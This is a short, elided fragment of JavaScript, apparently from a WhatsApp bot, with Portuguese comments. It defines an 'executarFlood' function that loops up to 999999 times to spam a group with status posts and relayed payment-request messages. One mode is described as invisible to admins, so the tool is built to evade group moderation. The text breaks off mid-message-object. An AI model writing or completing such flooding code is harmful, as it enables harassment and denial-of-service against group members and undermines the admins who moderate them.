...
async function executarFlood(sock, groupId) {
    try {
        ...
        const count = global.semLimites ? 999999 : (global.quantidadeDiv || 25);
        const modo = global.antiAdmMode || 'ambos';
        const semLimites = !!global.semLimites;

        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood (Modo: ${modo.toUpperCase()} | Sem Limites: ${semLimites ? "SIM 🚀" : "NÃO ❌"} | Quantidade: ${count})`);

        for (let i = 0; i < count; i++) {
            try {
                // 1. Envia Status (se for 'status' ou 'ambos') - Sempre invisível para admins
                ...
                // 2. Envia Chat (se for 'desativado' ou 'ambos')
                if (modo === 'desativado') {
                    // Chat visível (Normal)
                    await sock.relayMessage(groupId, {
                        requestPaymentMessage: {
